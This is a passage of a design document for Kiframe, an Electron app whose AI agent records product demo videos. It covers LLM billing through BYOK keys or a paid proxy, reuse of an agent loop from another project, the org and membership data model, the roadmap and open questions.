| **BYOK** | User pastes their OpenRouter (or OpenAI) key (stored in the OS keychain). Calls go straight to the provider | The user pays the provider directly |
| **Kiframe account (paid)** | The `LlmClient` points at **our proxy** (the `openai` SDK takes a custom `baseURL`; the proxy speaks the same OpenAI-compatible API as OpenRouter). The proxy authenticates the user, meters usage **per org**, applies plan limits and holds our key | Only prompts and **blurred** screenshots go through us, never vault secrets |

Still to decide: the proxy's retention policy (§12), and pricing.

### 10.4 Architecture
```
┌─────────────────────────── Kiframe desktop app (Electron) ───────────────────────────┐
│ Renderer (UI)                                                                         │
│   Chat · Sequence (v0) / Canvas (v0.1) · Preview/timeline · Vault forms · Live browser│
│   Compositor (PixiJS) + export (WebCodecs + Mediabunny): preview = export            │
│───────────────────────────────────── IPC ─────────────────────────────────────────────│
│ Main process (Node)                                                                   │
│   Agent loop (from cooldown, §10b) ──▶ OpenRouter / OpenAI (BYOK) / Kiframe proxy     │
│     tools: browser.*, vault.list/request, scene.*, composition.*, history.*           │
│   Automation runtime (Playwright)                                                     │
│     ├─ secret resolver (fill only, origin- and field-bound)  ◀── OS keychain          │
│     ├─ output scrubber + DOM-text scanner (§7.4)                                      │
│     └─ targets: Chromium (web, v0) · Electron app (v0.1)                              │
│   Recorder: page.screencast / CDP at DPR 2 + event log → take (pinned or scratch)     │
│   Project store: folder on disk + hidden history (OBJECT-MODEL §5b)                   │
└───────────────────────────────────────────────────────────────────────────────────────┘
                         ▲ auth, orgs, settings, metering, LLM proxy (paid)
                   ┌─────┴──────────┐
                   │ Kiframe server │
                   └────────────────┘
```

## 10b. Reusing the agent runtime from `../cooldown`

Reviewed 2026-09-25, spot-checked 2026-09-26. cooldown is Tauri + React 19. Its agent runs in the webview through the OpenAI-format SDK (BYOK or OpenRouter) or a metered backend proxy.

**Worth reusing** (clean, strict TS, around 60 test files; the loop has no Tauri imports):
- `engine/agent-loop.ts`: an `async function*` that yields events, with the LLM behind an injected `LlmClient` interface
- `defineTool` with Zod schemas, and the single `executeToolCall` path with one structured failure type (`tool-result.ts`)
- `tool-result-view.ts` (hides old, bulky tool results from the model's context) and `stream-assemble.ts`
- the deny/once/always approval gate (`tool-confirm-store.ts`), turned into a general `requestUser({kind, schema})` for vault forms and risky-action approvals
- the `StorageEngine` / ChatRepo pattern
- (v0.1) the board: `@canvas-harness`, `chrome/slides-panel.tsx`, `views/linear-view.tsx`, `canvas/use-presentation-mode.ts`
- (v0) the loopback OAuth pattern (`src-tauri/src/oauth.rs`) for desktop sign-in, ported to Electron

**Changes for Kiframe:**
1. **The agent loop runs in the Electron main (Node) process**, not in the UI. The UI gets `AgentEvent`s over IPC and answers `hitl.request` messages.
2. **Keep cooldown's OpenAI-compatible `LlmClient`** (`byok-client.ts`, the `openai` SDK) with OpenRouter as the default base URL (decision 2026-09-27, replacing an Anthropic-native client). Anthropic prompt caching and reasoning still work through OpenRouter (`cache_control` on content parts, the `reasoning` parameter).
3. **Fix before reusing:**
   - no cancellation (no AbortSignal)
   - no call id on events (parallel calls to the same tool get mis-paired)
   - hitting max turns ends the run silently
   - assistant text is dropped on tool-call turns
   - history is flattened to XML text instead of replayed as structured tool messages
   - a second approval request is auto-denied instead of queued
   - no retry or backoff on 429/5xx
4. **Keys:** cooldown stores BYOK keys in plaintext localStorage. Kiframe uses the OS keychain. Also fix cooldown's inconsistency: signed-in users are always metered even with a saved key (`services/resolve.ts` vs `services/context.ts:34`).

**Don't reuse:** `use-local-submit-prompt.ts` (a monolith coupled to the board), the board tools and prompts, the key storage, the Tauri SQLite persistence. The chat components (`tool-step-row.tsx`, reasoning steps) are good visual references but are coupled to board and billing code.

## 10c. Accounts, orgs and settings

### Model
Classic multi-tenant: **users belong to orgs through memberships**. Every user gets a **personal org** at sign-up. `defaultOrgId` is the org Kiframe opens by default (initially the personal one). Users can be **invited** to other orgs.

```ts
type User = {
  id: string; email: string; name: string; avatarUrl?: string;
  personalOrgId: OrgId;          // created at sign-up, can't be deleted or left
  defaultOrgId: OrgId;           // the org opened by default. Any org the user belongs to
  createdAt: string;
};

type Org = {
  id: OrgId; name: string; slug: string;
  personal: boolean;             // personal org: a single member, no invitations
  plan: "free" | "pro" | "team"; // billing and LLM metering are per org
  createdAt: string;
};

type Membership = { orgId: OrgId; userId: string; role: "owner" | "admin" | "member"; joinedAt: string };

type Invitation = {
  id: string; orgId: OrgId; email: string; role: "admin" | "member";
  tokenHash: string; invitedBy: string; expiresAt: string; acceptedAt?: string;
};
```
Rules:
- An org always has at least one owner, so the last owner can't leave or be demoted.
- Invitations are sent by email with a single-use expiring link. If the invited person has no account, they sign up and join directly.
- A personal org can't invite anyone. To collaborate, the user creates a team org (the GitHub model). This keeps billing and ownership clear.
- Projects belong to **one org** (`project.json: orgId`). In v0, project **content stays local**, and the server only knows orgs, members, settings and usage. Team sync of projects comes later (git remote + shared take store).

### Settings: layered resolution
```
product defaults → org settings → project settings → scene overrides → step overrides
                                      (user preferences are separate: they never change the output)
```

| Level | Examples | Stored |
|---|---|---|
| **Org** | Brand kit (logo, colors, fonts, cursor style), style and output presets, **environments** (URLs, `sandbox` flag, pre-approved teardowns), shared **interrupt/hide rule bank**, **required secret names** per environment, LLM policy (proxy only, BYOK allowed), proxy data retention | Server (synced) |
| **Project** | Target environment, viewport, pacing defaults, presets, redaction, overrides of org style | Project folder (`project.json`) |
| **Scene / step** | Overrides (OBJECT-MODEL §0.6, §2) | Project folder |
| **User** | UI preferences, language, default org, keyboard shortcuts, BYOK key | UI prefs on the server. **BYOK key and vault values: local keychain only** |

**Environments** are the link between accounts and safety. An org declares "Staging (sandbox)" and "Demo (sandbox)", and the agent's risky-action rules (§7.2–7.3) follow the environment's flag.

**Secrets and orgs:** the org declares that "Staging needs `acme_staging.email` and `acme_staging.password`". Each member fills in **their own values** on **their own machine**. Kiframe shows "2 secrets missing for this project" without ever syncing values.

### Auth
- Desktop sign-in through the system browser: **loopback OAuth** (Google / GitHub) or a magic link, following the pattern of cooldown's `oauth.rs`. Tokens go in the OS keychain.
- Works **offline** after the first sign-in, except for proxy calls and settings sync (cached locally).

---

## 11. Roadmap

> Detailed plan (phases → PRs, objectives, exit criteria, complexity, LOC): [IMPLEMENTATION-PLAN.md](./IMPLEMENTATION-PLAN.md).

- **Phase 0 (spike, ~2 weeks, pre-v0):** tests the three big unknowns on **web apps**.
  1. **Quality:** a hand-written scene (OBJECT-MODEL §2) → take through `page.screencast` at DPR 2 → generators → PixiJS export, **including a 2.5× zoom and captions over pauses**. Would we publish the result?
  2. **Grounding:** the agent writes and grounds a 10–15 step scene on 3 apps (one we don't control), with a handful of questions at most. **Measure tokens, cost and time per scene.**
  3. **State:** 5 consecutive replays with `ensure` + `teardown` on a resettable demo account → 5 clean takes.

  In parallel: a quick check of `_electron.launch` vs `connectOverCDP` on one **hardened, packaged** Electron app (input for v0.1). Start the failure catalogue.
- **v0 (first release):**
  - web targets
  - chat + agent (cooldown loop), grounding, **basic heal on failure**
  - **Sequence view** (ordered scene list)
  - scene kinds `recording` + `card`
  - outputs **video + guide**
  - vault (hardened, §7.4), BYOK
  - accounts + orgs + invitations (§10c)
  - **headless CLI re-run** (re-record stale scenes, re-export)
  - signing, notarization, auto-update
- **v0.1:**
  - **Canvas view** (reusing cooldown's board)
  - Electron targets
  - `still` and `media` scene kinds
  - composition editor (timeline)
  - paid proxy
- **Later:**
  - HTML presentation and GIF outputs
  - voiceover + languages
  - Compare / variants in history
  - TOTP in the vault
  - Tauri targets
  - team sync of projects
  - CI integration (regenerate on every release)
  - DOM-capture spike (OBJECT-MODEL §0.7, option C)

---

## 12. Open questions

Answered: see §0.

Still open:
1. **Paid proxy and data:** do we store or log prompts and (blurred) screenshots on our server? What retention? This matters a lot for B2B trust.
2. Should project folders live **in the app's repo** (demos as code), in Kiframe's own storage, or either (user's choice)? See OBJECT-MODEL §5b for the git implications.
3. **Tauri targets:** is it worth faking the backend with `mockIPC` for demos, or do we need the real app?
4. **Pricing** (COMPETITORS §4).
